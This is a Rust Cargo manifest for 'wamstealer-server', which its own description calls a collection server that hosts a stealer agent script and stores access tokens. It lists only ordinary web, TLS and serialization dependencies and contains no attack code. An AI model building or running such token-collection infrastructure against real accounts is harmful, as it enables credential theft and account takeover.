[package]
name = "wamstealer-server"
version = "0.1.0"
edition = "2021"
rust-version = "1.82"
description = "Collection server for the WAMStealer agent: hosts the agent script and stores access tokens"
license = "MIT"
publish = false

[lib]
path = "src/lib.rs"

[[bin]]
name = "wamstealer-server"
path = "src/main.rs"

[dependencies]
wamstealer = { path = ".." }
axum = "0.8"
axum-server = { version = "0.7", features = ["tls-rustls"] }
rustls = { version = "0.23", features = ["ring"] }
tokio = { version = "1", features = ["rt-multi-thread", "macros"] }
clap = { version = "4", features = ["derive"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
csv = "1"
chrono = { version = "0.4", features = ["clock"] }
base64 = "0.22"
getrandom = "0.3"
x509-parser = "0.16"
